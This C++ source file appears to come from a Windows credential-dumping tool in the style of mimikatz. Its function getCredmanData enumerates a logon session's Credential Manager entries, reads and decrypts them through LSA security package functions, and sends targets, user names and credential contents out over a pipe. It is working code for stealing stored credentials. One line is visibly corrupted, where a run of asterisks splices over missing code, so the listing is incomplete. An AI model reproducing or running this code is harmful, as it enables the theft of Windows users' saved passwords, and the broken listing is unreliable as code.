bool WINAPI getCredmanData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream message;
	if(searchCredmanFuncs())
	{
		DWORD credNb = 0;
		PCREDENTIAL * pCredential = NULL;
		DWORD CredIEnumerateFlags = (mod_system::GLOB_Version.dwMajorVersion < 6) ? 0 : CRED_ENUMERATE_ALL_CREDENTIALS;
		NTSTATUS status = (mod_system::GLOB_Version.dwBuildNumber < 8000 ) ? CredIEnumerate(logId, 0, NULL, CredIEnumerateFlags, &credNb, &pCredential) : reinterpret_cast<PCRED_I_ENUMERATE62>(CredIEnumerate)(logId, NULL, CredIEnumerateFlags, &credNb, &pCredential);

		if(NT_SUCCESS(status))
		{
			for(DWORD i = 0; i < credNb; i++)
			{
				wstring Target(pCredential[i]->TargetName);
				wstring ShortTarget = (mod_system::GLOB_Version.dwMajorVersion < 6) ? Target : Target.substr(Target.find_first_of(L'=') + 1);
					
				message << endl;
				if(justSecurity)
					message << L"\t [" << i << L"] " << Target << L'\t';
				else message <<
					L"\t * [" << i << L"] Target   : " << Target << L" / " << (pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>") << endl <<
					L"\t * [" << i << L"] Comment  : " << (pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>") << endl <<
					L"\t * [" << i << L"] User     : "******"[" << j << L"] ";
							message << descEncryptedCredential(pEncryptedCredential[j], justSecurity, prefix.str());
						}
						SeckPkgFunctionTable->CrediFreeCredentials(dwNbCredentials, pEncryptedCredential);
					}
					else message << L"Erreur CrediReadDomainCredentials : " << mod_system::getWinError(false, status);
				}
				else
				{
					PENCRYPTED_CREDENTIALW pEncryptedCredential;
					NTSTATUS status = SeckPkgFunctionTable->CrediRead(logId, CREDP_FLAGS_IN_PROCESS, const_cast<wchar_t *>(ShortTarget.c_str()), pCredential[i]->Type, 0, &pEncryptedCredential);
					if(NT_SUCCESS(status))
					{
						message << descEncryptedCredential(pEncryptedCredential, justSecurity);
						CredFree(pEncryptedCredential);
					}
					else message << L"Erreur CrediRead : " << mod_system::getWinError(false, status);
				}
			}
			CredFree(pCredential);
		}
		else message << L"CredIEnumerate KO : " << mod_system::getWinError(false, status);
	} else message << L"n.a. (credman KO)";
	return sendTo(monPipe, message.str());
}